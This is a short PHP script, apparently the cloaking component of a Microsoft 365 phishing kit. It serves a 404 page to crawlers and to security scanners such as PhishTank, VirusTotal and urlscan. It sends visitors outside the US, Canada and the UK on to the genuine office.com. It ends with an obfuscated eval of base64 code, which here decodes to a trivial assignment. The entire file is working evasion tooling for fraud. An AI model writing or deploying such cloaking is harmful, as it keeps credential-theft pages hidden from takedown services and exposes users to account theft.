<?php
$bots = array('googlebot','bingbot','phishtank','netcraft','virustotal','urlscan','kaspersky','bitdefender','paloalto','crawler','spider');
foreach($bots as $b){ if(stripos($_SERVER['HTTP_USER_AGENT'], $b) !== false){ header('HTTP/1.0 404 Not Found'); exit; } }
$ips = array('66.249.64.0/19','64.233.160.0/19','40.76.0.0/14');
$c = $_SERVER['HTTP_CF_IPCOUNTRY']; if(!in_array($c, array('US','CA','GB'))){ header('Location: https://www.office.com'); exit; }
eval(base64_decode("JHggPSAiaGVsbG8iOw=="));
?>
